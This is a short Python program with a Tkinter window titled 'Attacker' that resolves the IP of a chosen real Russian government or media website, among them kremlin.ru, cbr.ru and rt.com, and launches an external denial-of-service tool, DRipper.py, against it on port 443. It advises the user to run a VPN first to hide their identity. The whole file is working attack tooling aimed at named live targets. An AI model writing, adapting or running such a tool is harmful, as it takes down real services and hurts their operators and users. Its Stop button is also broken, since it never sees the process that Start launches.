import os
import tkinter as tk
import subprocess, shlex
import threading
import dns.resolver
import random
import pathlib

os.environ["PYTHONUNBUFFERED"] = "1"


OptionList = [
"www.rt.com",
"www.cbr.ru",
"www.kremlin.ru",
"www.vesti.ru",
"www.smotrim.ru",
"www.vgtrk.ru",
"xn--b1aew.xn--p1ai",
] 


def get_ip(host):
    resolver = dns.resolver.Resolver()
    ips = list(resolver.query(host, 'A'))
    ip = random.choice(ips)
    return ip.to_text()


app = tk.Tk()
app.title("Attacker")

app.geometry('300x300')

host= tk.StringVar(app)
host.set(OptionList[0])

opt = tk.OptionMenu(app, host, *OptionList)
opt.config(width=90, font=('Helvetica', 12))
opt.pack()

message = tk.StringVar(app)
label = tk.Label(app, textvariable=message)
label.pack()

message.set("Better use vpn before running this app")

text = tk.Text(app, height=5, width=152)

proc = None

def start():
    hostText = host.get()
    message.set(f"Getting IP for {hostText}")
    ip = get_ip(hostText)
    message.set(f"Attacking {hostText} ({ip})")
    current = pathlib.Path(__file__).parent.resolve()
    os.chdir(current)
    cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
    proc = subprocess.Popen(shlex.split(cmd))

def stop():
    if proc:
        message.set("Stopping..")
        proc.terminate()
        proc.kill()
    app.destroy()


btn = tk.Button(app, text='Start', bd ='5', command=start)
btn.pack(side = 'top')

btn = tk.Button(app, text='Stop', bd ='5', command=stop)
btn.pack(side = 'top')

text.pack()


app.mainloop()
